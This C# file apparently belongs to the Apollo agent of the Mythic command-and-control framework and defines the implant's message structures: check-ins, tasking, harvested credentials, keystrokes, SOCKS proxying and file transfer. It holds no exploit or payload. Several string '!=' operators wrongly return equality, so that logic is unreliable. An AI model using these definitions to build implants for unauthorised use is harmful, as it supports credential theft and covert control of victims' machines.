using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using sCredentialType = System.String;
using sStatusMessage = System.String;
using sMessageAction = System.String;
using EdgeDirection = System.Int32;

namespace ApolloInterop.Structs
{
    public class MythicStructs
    {
        // Profile data sent from the Mythic Server
        public struct C2ProfileData
        {
            public string name;
            public string is_p2p;
            public Dictionary<string, string> parameters;
        }

        public class CredentialType
        {
            private CredentialType(string value) { Value = value; }
            public string Value { get; private set; }
            public override string ToString() { return Value; }
            public static CredentialType Plaintext { get { return new CredentialType("plaintext"); } }
            public static CredentialType Certificate { get { return new CredentialType("certificate"); } }
            public static CredentialType Hash { get { return new CredentialType("hash"); } }
            public static CredentialType Key { get { return new CredentialType("key"); } }
            public static CredentialType Ticket { get { return new CredentialType("ticket"); } }
            public static CredentialType Cookie { get { return new CredentialType("cookie"); } }

            public static bool operator ==(CredentialType a, CredentialType b) { return a.Value == b.Value; }

            public static bool operator !=(CredentialType a, CredentialType b) { return a.Value != b.Value; }

            public static bool operator ==(string a, CredentialType b) { return a == b.Value; }

            public static bool operator !=(string a, CredentialType b) { return a == b.Value; }
        }

        struct Credential
        {
            sCredentialType credential_type;
            string realm;
            string credential;
            string account;
        }

        struct RemovedFileInformation
        {
            string host;
            string path;
        }

        struct FileInformation
        {
            string full_name;
            string name;
            string directory;
            string creation_date;
            string modify_time;
            string access_time;
            Dictionary<string, string> permissions;
            string extended_attributes;
            int size;
            string owner;
            string group;
            bool hidden;
            bool is_file;
        }

        struct FileBrowser
        {
            string host;
            bool is_file;
            Dictionary<string, string> permissions;
            string name;
            string parent_path;
            bool success;
            string access_time;
            string modify_time;
            int size;
            FileInformation[] files;
        }

        const EdgeDirection SourceToDestination = 1;
        const EdgeDirection DestinationToSource = 2;
        const EdgeDirection BiDirectional = 3;

        struct EdgeNode
        {
            string source;
            string destination;
            EdgeDirection direction;
            string metadata;
            string action;
            string c2_profile;
        }

        struct SocksDatagram
        {
            int server_id;
            string data;
        }

        struct Artifact
        {
            string base_artifact;
            string artifact;
        }
        public class StatusMessage
        {
            private StatusMessage(string value) { Value = value; }
            public string Value { get; private set; }
            public override string ToString() { return Value; }
            public static StatusMessage Success { get { return new StatusMessage("success"); } }
            public static StatusMessage Error { get { return new StatusMessage("error"); } }
            public static StatusMessage Processing { get { return new StatusMessage("processing"); } }
            public static StatusMessage Complete { get { return new StatusMessage("complete"); } }
        
            public static bool operator ==(StatusMessage a, StatusMessage b) { return a.ToString() == b.ToString(); }

            public static bool operator !=(StatusMessage a, StatusMessage b) { return a.ToString() != b.ToString();}

            public static bool operator ==(string a, StatusMessage b) { return a == b.ToString(); }

            public static bool operator !=(string a, StatusMessage b) { return a == b.ToString(); }
        }
        
        struct TaskStatus
        {
            string task_id;
            sStatusMessage status_message;
            string error;
        }

        struct TaskResponse
        {
            object user_output;
            bool? completed;
            string user;
            string window_title;
            string keystrokes;
            string task_id;
            StatusMessage status;
            EdgeNode[] edges;
            FileBrowser? file_browser;
            string message_id;
            Credential[] credentials;
            RemovedFileInformation[] removed_files;
            Artifact[] artifacts;
        }

        struct DownloadRegistrationMessage
        {
            string task_id;
            int total_chunks;
            string full_path;
            string host;
            bool is_screenshot;
        }

        struct DownloadProgressMessage
        {
            string task_id;
            string file_id;
            int chunk_num;
            string chunk_data;
        }

        struct Task
        {
            string command;
            string parameters;
            float timestamp;
            string id;
        }

        public class MessageAction
        {
            private MessageAction(string value) { Value = value; }
            public string Value { get; private set; }
            public override string ToString() { return Value; }
            public static MessageAction GetTasking { get { return new MessageAction("get_tasking"); } }
            public static MessageAction PostResponse { get { return new MessageAction("post_response"); } }
            public static MessageAction CheckIn { get { return new MessageAction("checkin"); } }
            public static MessageAction Upload { get { return new MessageAction("upload"); } }
            public static MessageAction StagingRSA { get { return new MessageAction("staging_rsa"); } }
            public static MessageAction StagingDH { get { return new MessageAction("staging_dh"); } }

            public static bool operator ==(MessageAction a, MessageAction b) { return a.ToString() == b.ToString(); }

            public static bool operator !=(MessageAction a, MessageAction b) { return a.ToString() != b.ToString(); }

            public static bool operator ==(string a, MessageAction b) { return a == b.ToString(); }

            public static bool operator !=(string a, MessageAction b) { return a == b.ToString(); }
        }

        enum IntegrityLevel
        {
            UnknownIntegrity = 0,
            LowIntegrity,
            MediumIntegrity,
            HighIntegrity,
            SystemIntegrity
        }

        struct TaskingMessage
        {
            sMessageAction action;
            int tasking_size;
            Dictionary<string, string>[] delegates;
            TaskResponse[] responses;
            SocksDatagram[] socks;
        }

        struct CheckinMessage
        {
            static MessageAction action = MessageAction.CheckIn;
            string os;
            string user;
            string host;
            int pid;
            string ip;
            string uuid;
            string architecture;
            string domain;
            IntegrityLevel integrity_level;
            string external_ip;
            string encryption_key;
            string decryption_key;
            string pub_key;
            string session_id;
        }

        struct UploadMessage
        {
            static MessageAction action = MessageAction.Upload;
            int chunk_size;
            string file_id;
            int chunk_num;
            string full_path;
            string task_id;
        }

        struct MessageResponse
        {
            sMessageAction action;
            string id;
            sStatusMessage status;
            Task[] tasks;
            TaskStatus[] responses;
            Dictionary<string, string>[] delegates;
            string session_key;
            string session_id;
            int total_chunks;
            int chunk_num;
            string chunk_data;
            string file_id;
            string task_id;
        }
    }
}
